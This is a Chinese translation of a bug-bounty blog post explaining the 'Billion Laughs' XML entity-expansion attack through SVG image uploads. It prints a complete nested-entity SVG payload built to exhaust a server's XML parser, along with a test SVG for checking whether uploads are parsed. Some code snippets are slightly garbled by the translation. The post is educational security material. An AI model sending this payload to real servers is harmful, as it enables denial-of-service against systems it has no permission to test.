<html>
<head>
<title>Kill ’em With Laughter: “The Billion Laughs” Attack Through Image Uploads</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用笑声杀死他们:“十亿个笑声”通过图片上传攻击</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/kill-em-with-laughter-the-billion-laughs-attack-through-image-uploads-4e9c57ca6434?source=collection_archive---------0-----------------------#2020-06-29">https://infosecwriteups.com/kill-em-with-laughter-the-billion-laughs-attack-through-image-uploads-4e9c57ca6434?source=collection_archive---------0-----------------------#2020-06-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/afe4e82b9fb97592d975847a1318d75f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lRNnxle7O73Wb1xbmiUmug.jpeg"/></div></div></figure><p id="42ba" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">黑客总是笑到最后。</p><blockquote class="kw kx ky"><p id="13fc" class="jy jz kz ka b kb kc kd ke kf kg kh ki la kk kl km lb ko kp kq lc ks kt ku kv ij bi translated">声明:在你无权测试的系统上尝试这个是非法的。如果你发现了一个漏洞，请负责任地向程序披露。<strong class="ka ir">这可不是闹着玩的……</strong></p></blockquote><h1 id="abb7" class="ld le iq bd lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma bi translated">我们将复习的内容:</h1><ul class=""><li id="ecae" class="mb mc iq ka b kb md kf me kj mf kn mg kr mh kv mi mj mk ml bi translated">什么是十亿笑攻击？</li><li id="4ad9" class="mb mc iq ka b kb mm kf mn kj mo kn mp kr mq kv mi mj mk ml bi translated">如何在网站中找到并利用这个漏洞？</li><li id="f236" class="mb mc iq ka b kb mm kf mn kj mo kn mp kr mq kv mi mj mk ml bi translated">信用/资源</li></ul><p id="8486" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，介绍一下。你好，读者！我在网上的黑客化名是<a class="mr ms ep" href="https://medium.com/u/3e3753492422?source=post_page-----4e9c57ca6434--------------------------------" rel="noopener" target="_blank">思维摇摆</a>，我是一名狂热的赏金猎人。两个月前，当我第一次加入Hackerone 时，我开始了我的bugbounty之旅。这是我的第一篇关于一个非常有趣的漏洞类的博文，它有点复杂，所以我会尽可能清晰地解释它！</p><h1 id="e2b3" class="ld le iq bd lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma bi translated">什么是十亿笑攻击？</h1><p id="933e" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mu kl km kn mv kp kq kr mw kt ku kv ij bi translated">有许多不同类型的“十亿次大笑”攻击，但我将通过图片上传来了解其中一种。为了解释这一点，我们必须回顾一些关于图像、图像类型以及它们如何上传到服务器的关键基础知识。</p><p id="3942" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">大多数人可能都熟悉常见的图像扩展名，如PNG、JPEG和GIF。SVG呢？没听说过？这种攻击可能通过图片上传的全部原因就在于此。</p><p id="09e0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">上传个人资料图片时，让我们看看</strong><a class="ae mt" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">POST</strong></a><strong class="ka ir">请求中的典型PNG图像:</strong></p><figure class="my mz na nb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mx"><img src="../Images/8f1210ba15bd34ef238a5689c3cacb3f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lCfwQskWPLlukjsAU0i-Ag.jpeg"/></div></div><figcaption class="nc nd gj gh gi ne nf bd b be z dk translated">红色圆圈指出了请求正文中的PNG图像</figcaption></figure><p id="e7ba" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">现在让我们看一个典型的</strong><a class="ae mt" href="https://www.w3schools.com/graphics/tryit.asp?filename=trysvg_circle" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">SVG</strong></a><strong class="ka ir">图片在</strong><a class="ae mt" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">POST</strong></a><strong class="ka ir">请求上传期间:</strong></p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="8bac" class="nl le iq nh b gy nm nn l no np">&lt;svg height=”100" width=”100"&gt;<br/> &lt;circle cx=”50" cy=”50" r=”40" stroke=”black” stroke-width=”3" fill=”red” /&gt;<br/>&lt;/svg&gt;</span><span id="1855" class="nl le iq nh b gy nq nn l no np">^^Replace the PNG image above with this SVG image and some websites will treat it like a regular image and upload it.</span></pre><p id="7908" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有什么区别吗？</p><p id="286e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，SVG看起来更像一种标记语言，而不是图像。SVG由一种叫做<a class="ae mt" href="https://www.w3schools.com/XML/xml_whatis.asp" rel="noopener ugc nofollow" target="_blank"> XML </a>的标记语言组成。SVG上传本身不是一个漏洞，并且是常用的，但是它们很容易被修改成坏事。让我们通过SVG图像来理解十亿次笑声攻击是如何工作的。</p><p id="270f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">简单的SVG上传在</strong> <a class="ae mt" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">发布</strong> </a> <strong class="ka ir">请求:</strong></p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="8115" class="nl le iq nh b gy nm nn l no np">&lt;!ENTITY lol "lol"&gt;<br/>&lt;!ELEMENT lolz (#PCDATA)&gt;<br/>]&gt;<br/>&lt;svg&gt;<br/>&lt;text&gt;&amp;lol;&lt;/text&gt;<br/>&lt;/svg&gt;</span></pre><p id="5408" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">让我们一行一行地过一遍。在XML中，有一个实体，类似于python中的变量。就像在python中设置变量一样:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="0c1f" class="nl le iq nh b gy nm nn l no np">x = "Hello World!"</span></pre><p id="8864" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">您可以在XML中设置实体:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="b737" class="nl le iq nh b gy nm nn l no np"><strong class="nh ir">&lt;!ENTITY x </strong>“Hello World!”<em class="kz">&gt;</em></span></pre><p id="c77d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">要调用一个实体，您需要在它的前面加上一个&amp;符号，在它的后面加上一个分号。所以如果我想调用实体<code class="fe nr ns nt nh b">x</code>,我会这样做:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="aea8" class="nl le iq nh b gy nm nn l no np">&amp;x;</span></pre><p id="60d2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">回到我们的例子，当我们看到第一行中的实体<code class="fe nr ns nt nh b">lol</code>时，如果它被调用，SVG图像会显示文本“lol”。现在让我们进入恶意的东西。</p><p id="8b40" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">亿笑攻击SVG有效载荷</strong> <a class="ae mt" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods" rel="noopener ugc nofollow" target="_blank"> <strong class="ka ir">帖子</strong> </a> <strong class="ka ir">请求:</strong></p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="746e" class="nl le iq nh b gy nm nn l no np">&lt;!ENTITY lol "lol"&gt;<br/>&lt;!ELEMENT lolz (#PCDATA)&gt;<br/>&lt;!ENTITY lol1 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;<br/>&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;<br/>&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;<br/>&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;<br/>&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;<br/>&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;<br/>&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;<br/>&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;<br/>&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;<br/>]&gt;<br/>&lt;svg&gt;<br/>&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;<br/>&lt;/svg&gt;</span></pre><p id="bb69" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我们知道了实体和XML调用是如何工作的，我们可以开始讨论这种攻击是如何工作的。我们一行一行来看。首先，我们将实体<code class="fe nr ns nt nh b">lol</code>设置为字符串值<code class="fe nr ns nt nh b">"lol"</code></p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="4db0" class="nl le iq nh b gy nm nn l no np">&lt;!ENTITY lol "lol"&gt;</span></pre><p id="1308" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">接下来，我们设置实体<code class="fe nr ns nt nh b">lol1</code>调用&amp;lol；10次:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="ec15" class="nl le iq nh b gy nm nn l no np">&lt;!ENTITY lol1<!-- --> "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span></pre><p id="5801" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们还设置实体lol2调用<code class="fe nr ns nt nh b">&amp;lol1;</code> 10次:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="e7dd" class="nl le iq nh b gy nm nn l no np">&lt;!ENTITY lol2 "&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;"&gt;</span></pre><p id="b228" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，假设我们在这里停下来调用<code class="fe nr ns nt nh b">&amp;lol1;</code>，发生的情况是，服务器端XML解析器必须调用lol2，lol 2被定义为<code class="fe nr ns nt nh b">&amp;lol1</code> 10 <em class="kz">乘以</em>。这只是针对它在<code class="fe nr ns nt nh b">&amp;lol2;</code>中看到的第一个<code class="fe nr ns nt nh b">&amp;lol1;</code>，解析器现在必须调用实体10次。</p><p id="575f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果我们像在原始有效载荷中看到的那样再重复7次<strong class="ka ir">该死的次数</strong>，服务器将不得不解析10⁹实体，导致它在十亿个LOL的笑声中死去<strong class="ka ir">。</strong></p><figure class="my mz na nb gt jr gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/3f3d67b1cc666989e365fc1fac791b60.png" data-original-src="https://miro.medium.com/v2/resize:fit:912/1*MF3LJftUtQ7JUvmNeUhrEg.gif"/></div><figcaption class="nc nd gj gh gi ne nf bd b be z dk translated">这是一个很大的损失</figcaption></figure><h1 id="301a" class="ld le iq bd lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma bi translated">如何在网站中找到并利用这个漏洞？</h1><p id="07dd" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mu kl km kn mv kp kq kr mw kt ku kv ij bi translated"><em class="kz">图像上传。</em>查找POST请求中使用图像的每个实例，并用SVG替换它，看看服务器端XML阅读器是否会解析它。</p><p id="98f1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">测试它的一种方法是查看浏览器是否解析静态实体。例如，如果您已经确定了一个SVG上传，尝试添加这个小实体，看看服务器是否会用一些文本覆盖您的图像，检查它是否正在解析您的实体:</p><pre class="my mz na nb gt ng nh ni nj aw nk bi"><span id="879d" class="nl le iq nh b gy nm nn l no np">&lt;!DOCTYPE testingxxe [ &lt;!ENTITY xml "Hello World!"&gt; ]&gt; <br/>&lt;svg xmlns:svg="<a class="ae mt" href="http://www.w3.org/2000/svg" rel="noopener ugc nofollow" target="_blank">http://www.w3.org/2000/svg</a>" ae mt" href="http://www.w3.org/2000/svg" rel="noopener ugc nofollow" target="_blank"&gt;http://www.w3.org/2000/svg" xmlns:xlink="<a class="ae mt" href="http://www.w3.org/1999/xlink" rel="noopener ugc nofollow" target="_blank">http://www.w3.org/1999/xlink</a>" width="200" height="200"&gt;<br/>&lt;image height="30" width="30" xlink:href="<a class="ae mt" href="https://app.zivver.com/assets/img/shield.11ac41.svg" rel="noopener ugc nofollow" target="_blank">https://yourimage.com</a>" /&gt; <br/>&lt;text x="0" y="20" font-size="20"&gt;&amp;xml;&lt;/text&gt; <br/>&lt;/svg&gt;</span></pre><p id="f7ec" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果有效，调用文本标签之外的实体，您的有效负载将会执行！</p><h1 id="f159" class="ld le iq bd lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma bi translated">学分和额外资源:</h1><p id="a04b" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mu kl km kn mv kp kq kr mw kt ku kv ij bi translated">我想真诚地感谢那些帮助我修改我的第一篇博客的人，请继续在Twitter上关注他们吧！</p><blockquote class="kw kx ky"><p id="66cb" class="jy jz kz ka b kb kc kd ke kf kg kh ki la kk kl km lb ko kp kq lc ks kt ku kv ij bi translated">@ goobstersec @ vflagger @ DBlackwoodSec</p></blockquote><p id="357c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果你喜欢这个博客，请务必关注我的下一篇文章，我将在文章中介绍我的第一个有效错误，它是一个导致SSRF的SVG XXE。别担心，这比听起来简单多了！</p><p id="7aa5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">有关所有内容的额外资源，请查看以下页面:</p><div class="nv nw gp gr nx ny"><a href="https://portswigger.net/web-security/xxe" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">什么是XXE (XML外部实体)注入？教程和示例|网络安全学院</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">在这一节中，我们将解释什么是XML外部实体注入，描述一些常见的例子，解释如何…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">portswigger.net</p></div></div><div class="oh l"><div class="oi l oj ok ol oh om jw ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">十亿次大笑攻击</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">从维基百科，计算机安全的免费百科全书，十亿次大笑攻击是一种拒绝服务…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">en.wikipedia.org</p></div></div><div class="oh l"><div class="on l oj ok ol oh om jw ny"/></div></div></a></div><div class="nv nw gp gr nx ny"><a href="https://www.w3schools.com/graphics/svg_intro.asp" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">SVG教程</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">SVG代表可缩放矢量图形。SVG以XML格式定义了基于矢量的图形。通过我们的“亲自尝试”…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">www.w3schools.com</p></div></div><div class="oh l"><div class="oo l oj ok ol oh om jw ny"/></div></div></a></div><figure class="my mz na nb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi op"><img src="../Images/70c4fd043cb50beed774b4cbeb776e51.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*K7dyEjw6dfvg1ZOjEoCcDw.jpeg"/></div></div><figcaption class="nc nd gj gh gi ne nf bd b be z dk translated">XML思维导图</figcaption></figure><figure class="my mz na nb gt jr gh gi paragraph-image"><div class="gh gi oq"><img src="../Images/2d81d83d89f5d55f1d10d9f2facd457e.png" data-original-src="https://miro.medium.com/v2/resize:fit:900/format:webp/1*ws-HDOBDN7DKVb_HddHKXA.jpeg"/></div></figure></div></div>    
</body>
</html>